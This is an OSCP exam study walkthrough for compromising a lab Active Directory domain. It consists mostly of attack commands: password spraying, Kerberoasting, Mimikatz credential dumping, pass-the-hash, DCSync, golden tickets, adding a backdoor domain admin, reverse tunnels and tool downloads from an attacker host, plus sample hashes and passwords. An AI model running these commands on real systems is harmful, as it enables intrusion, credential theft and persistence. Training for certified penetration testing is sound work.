# OSCP Active Directory Set - Systematic Attack Walkthrough

## Overview
This walkthrough provides a methodical approach to compromise an Active Directory environment, designed to maximize your 40-point AD set completion. Follow this sequence for comprehensive coverage.

---

## Phase 0: Pre-Attack Preparation (5 minutes)

### Tools Verification Checklist
```bash
# On Kali - Verify all tools are present
which impacket-GetNPUsers impacket-GetUserSPNs impacket-secretsdump
which crackmapexec kerbrute chisel
which proxychains nmap smbclient
ls /usr/share/windows-resources/binaries/ # plink.exe, nc.exe

# Prepare working directory
mkdir -p ~/oscp/ad_set/{loot,tools,pivots}
cd ~/oscp/ad_set
```

### Quick Reference Files
Create these files for rapid access:
- `users.txt` - usernames discovered
- `passwords.txt` - passwords found
- `hashes.txt` - NTLM hashes collected
- `hosts.txt` - target systems
- `creds.txt` - working credentials (user:pass)

---

## Phase 1: Initial Foothold (Target: First Domain Credentials)

### Step 1.1: Network Enumeration (10-15 minutes)
```bash
# Full port scan on all provided IPs
nmap -p- -T4 --min-rate 1000 <IP> -oN full_ports.txt

# Service enumeration on open ports
nmap -p <ports> -sV -sC -oN services.txt <IP>

# Look for:
# - Port 88 (Kerberos) = Domain Controller
# - Port 389 (LDAP) = Domain Controller
# - Port 445 (SMB) = Potential targets
# - Port 5985 (WinRM) = Remote management
# - Port 3389 (RDP) = Remote desktop
# - Web ports (80, 443, 8080) = Potential entry points
```

### Step 1.2: Identify Attack Surface
**Priority Order:**
1. **Web applications** - Look for file upload, SQL injection, command injection
2. **SMB null sessions** - Anonymous access
3. **AS-REP Roastable accounts** - No preauthentication required
4. **Weak/default credentials** - Common passwords

```bash
# SMB enumeration
crackmapexec smb <IP> -u '' -p '' --shares  # Null session
crackmapexec smb <IP> -u 'guest' -p '' --shares

# Check for common usernames
crackmapexec smb <IP> -u users.txt -p '' --continue-on-success
```

### Step 1.3: Gain Initial Credentials
**Method A: Exploit Web Application**
- File upload → webshell → reverse shell
- SQL injection → database access → credentials
- Command injection → direct shell

**Method B: AS-REP Roasting (if usernames known)**
```bash
# If you have a username list
impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile asrep.hash corp.com/ -usersfile users.txt

# Crack the hash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

**Method C: Password Spraying**
```bash
# Create user list from enumeration
# Use safe password (1 attempt per 30 min per user)
kerbrute passwordspray -d corp.com users.txt "Welcome2024!"
kerbrute passwordspray -d corp.com users.txt "Password123!"
```

---

## Phase 2: Post-Compromise Enumeration (20-30 minutes)

### Step 2.1: Establish Access
```bash
# From Linux (if you have creds)
evil-winrm -i <IP> -u <user> -p <pass>

# OR via RDP
xfreerdp /u:<user> /p:<pass> /v:<IP> /cert-ignore

# OR get shell via web exploit
```

### Step 2.2: Situational Awareness
```powershell
# On compromised Windows host
whoami
whoami /all
whoami /priv
hostname
ipconfig /all
net user /domain
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

# Check what you can access
net view /domain
net view \\<dc-name>
```

### Step 2.3: Automated Enumeration
```powershell
# Download and run SharpHound
powershell -ep bypass
iwr -uri http://<your-ip>/SharpHound.ps1 -outfile SharpHound.ps1
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp -OutputPrefix "corp"

# Transfer ZIP to Kali
# In BloodHound: Mark owned users, run queries
```

**Key BloodHound Queries:**
1. "Shortest Paths to Domain Admins from Owned Principals"
2. "Find Computers where Domain Users are Local Admin"
3. "Shortest Paths to High Value Targets"
4. "Users with Most Privileges"

### Step 2.4: Manual Enumeration with PowerView
```powershell
# Download PowerView
iwr -uri http://<your-ip>/PowerView.ps1 -outfile PowerView.ps1
Import-Module .\PowerView.ps1

# Core enumeration
Get-NetDomain
Get-NetDomainController
Get-NetUser | select samaccountname, description
Get-NetGroup | select name
Get-NetGroup "Domain Admins" | select member
Get-NetComputer | select dnshostname, operatingsystem
Get-NetSession -ComputerName <dc-name>

# Find interesting permissions
Get-ObjectAcl -Identity "Domain Admins" | ? {$_.ActiveDirectoryRights -match "GenericAll|WriteProperty|GenericWrite"}

# Find shares
Find-DomainShare -CheckShareAccess
```

### Step 2.5: Hunt for Credentials
```powershell
# Search for passwords in files
Get-ChildItem -Path C:\ -Include *.txt,*.xml,*.config,*.ps1,*.bat -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"

# Check for GPP passwords (older systems)
# Look in SYSVOL share
findstr /S /I cpassword \\<dc>\sysvol\*.xml

# Environment variables
env | findstr /I "password\|pwd\|pass"

# PowerShell history
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

## Phase 3: Credential Attacks (15-20 minutes)

### Step 3.1: Kerberoasting
```bash
# From Linux (if you have domain creds)
impacket-GetUserSPNs -request -dc-ip <DC_IP> corp.com/user:password -outputfile kerberoast.hash

# Crack the hashes
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

```powershell
# From Windows
.\Rubeus.exe kerberoast /outfile:hashes.txt
# Transfer to Kali and crack
```

### Step 3.2: Dump Local Credentials
```powershell
# If you have local admin
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets /export

# Look for:
# - NTLM hashes
# - Cleartext passwords (if WDigest enabled)
# - Kerberos tickets
```

### Step 3.3: Password Spraying (Expanded)
```bash
# With discovered usernames, try more passwords
crackmapexec smb <DC_IP> -u users.txt -p 'Spring2024!' -d corp.com --continue-on-success
crackmapexec smb <DC_IP> -u users.txt -p 'Company123!' -d corp.com --continue-on-success
```

---

## Phase 4: Lateral Movement (20-30 minutes)

### Step 4.1: Identify Next Target
**From BloodHound:**
- Users with sessions on other computers
- Computers where you have admin rights
- Service accounts with SPNs
- Users with interesting group memberships

**From manual enum:**
```powershell
# Check admin access
Find-LocalAdminAccess
Get-NetSession -ComputerName <target>

# Look for high-value users logged in
Get-NetLoggedon -ComputerName <target>
```

### Step 4.2: Choose Lateral Movement Technique

**Option A: WinRM (Port 5985 open)**
```powershell
$pass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('corp\user', $pass)
New-PSSession -ComputerName <target> -Credential $cred
Enter-PSSession 1
```

**Option B: PsExec (SMB access)**
```powershell
.\PsExec64.exe -i \\<target> -u corp\user -p Password123! cmd
```

**Option C: Pass the Hash (if you have NTLM hash)**
```bash
impacket-wmiexec -hashes :08d7a47a6f9f66b97b1bae4178747494 corp/user@<target>
```

**Option D: Overpass the Hash**
```powershell
# In Mimikatz
sekurlsa::pth /user:jeff /domain:corp.com /ntlm:08d7a47a6f9f66b97b1bae4178747494 /run:powershell

# In new PowerShell window
net use \\<target>
.\PsExec.exe \\<target> cmd
```

### Step 4.3: Repeat Credential Dumping
On each new compromised system:
1. Run Mimikatz
2. Dump credentials
3. Look for Domain Admin or high-privilege accounts
4. Check for access to other systems

---

## Phase 5: Privilege Escalation to Domain Admin (15-25 minutes)

### Step 5.1: Identify Path to Domain Admin
**From BloodHound:**
- Direct path from owned user to DA?
- Exploitable ACLs?
- GenericAll/GenericWrite/WriteDacl permissions?

### Step 5.2: Exploit ACL Misconfiguration
```powershell
# If you have GenericAll on Domain Admins group
net group "Domain Admins" lowpriv_user /add /domain

# If you have GenericWrite on user
# Enable AS-REP Roasting
Set-DomainObject -Identity <target_user> -Set @{useraccountcontrol=4194304}
# Then AS-REP roast them

# If you have WriteDacl
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity lowpriv_user -Rights All
```

### Step 5.3: Constrained Delegation Abuse
```powershell
# If a user has constrained delegation
.\Rubeus.exe s4u /user:webservice /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/dc.corp.com /ptt

# Then access DC
ls \\dc\c$
```

### Step 5.4: Exploit Service Account
If you compromised a service account with high privileges:
```bash
# Kerberoast it if you haven't already
impacket-GetUserSPNs -request -dc-ip <DC_IP> corp.com/user:password

# Use the cracked service account password for access
```

---

## Phase 6: Domain Controller Compromise (10-15 minutes)

### Step 6.1: Verify Domain Admin Access
```powershell
# Can you access C$ share on DC?
net use \\dc\c$
ls \\dc\c$

# Test PsExec
.\PsExec64.exe \\dc cmd
whoami
```

### Step 6.2: DCSync Attack
```powershell
# From compromised machine with DA creds
.\mimikatz.exe
privilege::debug
lsadump::dcsync /user:corp\Administrator
lsadump::dcsync /user:corp\krbtgt

# Save the hashes!
```

```bash
# From Linux with DA creds
impacket-secretsdump corp.com/Administrator:password@<DC_IP> -just-dc-user krbtgt
impacket-secretsdump corp.com/Administrator:password@<DC_IP> -just-dc
```

### Step 6.3: Extract NTDS.dit (Alternative)
```cmd
# On DC with DA access
vshadow.exe -nw -p C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\temp\ntds.dit.bak
reg.exe save hklm\system c:\temp\system.bak

# Transfer to Kali and extract
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

---

## Phase 7: Golden Ticket & Persistence (5-10 minutes)

### Step 7.1: Create Golden Ticket
```powershell
# Get domain SID
whoami /user  # Copy SID without last part (RID)

# In Mimikatz
kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-XXXXXXXX /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt

# Launch cmd
misc::cmd

# Test access
PsExec.exe \\dc cmd
```

### Step 7.2: Verify Full Domain Access
```cmd
# From golden ticket session
dir \\dc\c$
dir \\<workstation>\c$
net user hacker Password123! /add /domain
net group "Domain Admins" hacker /add /domain
```

---

## Phase 8: Pivoting & Network Segments (If Applicable)

### Step 8.1: Identify Network Boundaries
```powershell
ipconfig /all
route print
arp -a
```

### Step 8.2: Setup Tunnels

**For HTTP-only restrictions:**
```bash
# On Kali
chisel server --port 8080 --reverse

# On compromised host
.\chisel.exe client <kali-ip>:8080 R:socks

# Use with proxychains
proxychains nmap -sT -Pn <internal-target>
```

**For SSH access:**
```bash
# Remote dynamic forward (from compromised host)
ssh -N -R 9998 kali@<kali-ip>

# On Kali, use proxychains
```

**For RDP access through firewall:**
```cmd
# From compromised Windows host
plink.exe -ssh -l kali -pw <pass> -R 127.0.0.1:9833:127.0.0.1:3389 <kali-ip>

# On Kali
xfreerdp /u:Administrator /p:password /v:127.0.0.1:9833
```

### Step 8.3: Attack Internal Segments
Repeat Phases 1-7 for newly accessible networks

---

## Critical Success Checklist

### Must Complete for 40 Points:
- [ ] Enumerate domain (users, groups, computers)
- [ ] Obtain low-privilege domain user credentials
- [ ] Compromise multiple workstations/servers
- [ ] Dump credentials from multiple systems
- [ ] Lateral movement between systems
- [ ] Escalate to Domain Admin or equivalent
- [ ] Access Domain Controller
- [ ] Prove domain compromise (DCSync or Golden Ticket)
- [ ] Document all local.txt and proof.txt flags
- [ ] Capture screenshots of domain admin access

### Proof of Compromise:
1. **Domain Admin access** - Screenshot of `whoami` showing DA group
2. **DC access** - `type C:\proof.txt` on Domain Controller
3. **DCSync output** - krbtgt hash or Administrator hash
4. **Golden Ticket** - Access to multiple systems with one ticket

---

## Time Management Strategy

| Phase | Time Allocation | Priority |
|-------|----------------|----------|
| Phase 1: Initial Foothold | 30 min | CRITICAL |
| Phase 2: Post-Compromise Enum | 30 min | CRITICAL |
| Phase 3: Credential Attacks | 20 min | HIGH |
| Phase 4: Lateral Movement | 30 min | HIGH |
| Phase 5: Privilege Escalation | 30 min | CRITICAL |
| Phase 6: DC Compromise | 15 min | CRITICAL |
| Phase 7: Golden Ticket | 10 min | MEDIUM |
| Phase 8: Pivoting (if needed) | 45 min | VARIABLE |
| **Total** | **3-4 hours** | |

**Buffer Time:** 1 hour for troubleshooting, documentation, and unexpected issues

---

## Common Pitfalls to Avoid

### ❌ Don't:
1. **Skip enumeration** - Rushing leads to missed attack paths
2. **Ignore BloodHound** - It saves hours of manual work
3. **Forget to document creds** - Keep organized notes
4. **Use IPs for Kerberos** - Always use hostnames
5. **Leave tools running** - Clean up as you go
6. **Miss obvious vectors** - Check web apps first
7. **Ignore time** - Sync time with DC for Kerberos
8. **Overlook service accounts** - Often have weak passwords

### ✅ Do:
1. **Enumerate thoroughly** - Spend time on enumeration
2. **Test credentials everywhere** - Reuse is common
3. **Save all hashes** - You might crack them later
4. **Check for SPNs** - Kerberoasting is often the key
5. **Look for sessions** - Find where admins are logged in
6. **Use BloodHound** - Visualize attack paths
7. **Stay organized** - Name files clearly, take notes
8. **Verify each step** - Don't assume commands worked

---

## Troubleshooting Quick Reference

| Problem | Solution |
|---------|----------|
| Kerberos clock skew | `net time \\dc /set /y` or `ntpdate <dc-ip>` |
| Can't crack hashes | Try more wordlists, check hash format |
| PsExec hangs | Use domain account, not local admin |
| WinRM fails | Check if user in Remote Management Users |
| Mimikatz fails | Try different version, check AV |
| BloodHound no data | Run SharpHound again with different methods |
| Chisel won't connect | Check firewall, try different port |
| Golden ticket fails | Use hostname not IP, verify krbtgt hash |

---

## Tools Quick Reference

### Must-Have Kali Tools:
```bash
impacket-GetNPUsers
impacket-GetUserSPNs
impacket-secretsdump
impacket-wmiexec
impacket-psexec
crackmapexec
kerbrute
proxychains
chisel
bloodhound
neo4j
evil-winrm
```

### Must-Have Windows Tools:
- PowerView.ps1
- SharpHound.ps1 / SharpHound.exe
- Mimikatz.exe
- Rubeus.exe
- PsExec64.exe
- Chisel.exe
- plink.exe
- nc.exe

### Transfer to Target:
```powershell
# PowerShell download
iwr -uri http://<kali-ip>/tool.exe -outfile C:\Temp\tool.exe

# Certutil (alternative)
certutil -urlcache -f http://<kali-ip>/tool.exe C:\Temp\tool.exe

# SMB (if accessible)
copy \\<kali-ip>\share\tool.exe C:\Temp\
```

---

## Final Exam Tips

### Before Exam:
1. **Practice the flow** - Run through this walkthrough multiple times
2. **Know your tools** - Be comfortable with all commands
3. **Setup templates** - Pre-create note files and command templates
4. **Test pivoting** - Practice tunneling scenarios
5. **Memorize hashes** - Know Hashcat modes: 18200, 13100, 1000

### During Exam:
1. **Start with AD set** - It's worth 40 points
2. **Take breaks** - Step away if stuck for 30+ minutes
3. **Document everything** - Screenshots, commands, credentials
4. **Stay organized** - One terminal per target, clear file names
5. **Don't give up** - AD chains can be long but rewarding

### If Stuck:
1. Re-run enumeration (PowerView, SharpHound)
2. Check BloodHound again
3. Try password spraying with new passwords discovered
4. Look for web applications (easiest entry)
5. Check for AS-REP roasting
6. Re-examine credentials collected
7. Take a 15-minute break and start fresh

---

## Success Metrics

### You know you're on track when:
- ✅ You have domain credentials within first hour
- ✅ BloodHound shows you attack paths within 90 minutes
- ✅ You've compromised 2+ systems within 2 hours
- ✅ You have local admin on multiple systems by hour 3
- ✅ You've found a path to Domain Admin by hour 3
- ✅ You have DA access by hour 4

### Red flags (reassess if):
- 🚩 No domain creds after 45 minutes → Try password spraying
- 🚩 No lateral movement after 2 hours → Re-check credentials
- 🚩 No path to DA after 3 hours → Review BloodHound carefully
- 🚩 Can't crack any hashes → Use Pass the Hash instead

---

## Post-Compromise Documentation Template

```
=== DOMAIN: corp.com ===

DOMAIN CONTROLLERS:
- DC01.corp.com (192.168.50.70)

COMPROMISED USERS:
1. jeff (password: HenchmanPutridBonkers11)
   - Groups: Domain Users
   - Access: CLIENT75, FILES04

2. jen (NTLM: 369def79d8372408bf6e93364cc93075)
   - Groups: Domain Admins
   - Access: All systems

COMPROMISED SYSTEMS:
1. CLIENT75 (192.168.50.75)
   - Initial: Web exploit
   - local.txt: [hash]
   
2. FILES04 (192.168.50.73)
   - Method: PsExec with jen creds
   - local.txt: [hash]

3. DC01 (192.168.50.70)
   - Method: DCSync with jen creds
   - proof.txt: [hash]

KEY FINDINGS:
- jeff account AS-REP roastable
- jen has Domain Admin rights
- Service account iis_service Kerberoastable
- SYSVOL contains GPP password (deprecated but found)

HASHES COLLECTED:
- Administrator: 2892d26cdf84d7a70e2eb3b9f05c425e
- krbtgt: 1693c6cefafffc7af11ef34d1c788f47
- jeff: 08d7a47a6f9f66b97b1bae4178747494
- jen: 369def79d8372408bf6e93364cc93075

ATTACK PATH:
Web Exploit → jeff (low-priv) → Kerberoast iis_service → Crack password → 
Lateral to FILES04 → Dump jen credentials → DCSync as jen → Full domain compromise
```

---

## Conclusion

This walkthrough is designed to maximize your success on the OSCP AD set. The key is:

1. **Systematic enumeration** - Don't skip steps
2. **Credential collection** - Test everywhere
3. **BloodHound usage** - Visualize paths
4. **Lateral movement** - Compromise multiple systems
5. **Privilege escalation** - Work toward Domain Admin
6. **Documentation** - Prove your access

**Remember:** The AD set is a chain. Each compromise leads to the next. Stay methodical, stay organized, and you'll get those 40 points!

Good luck! 🎯
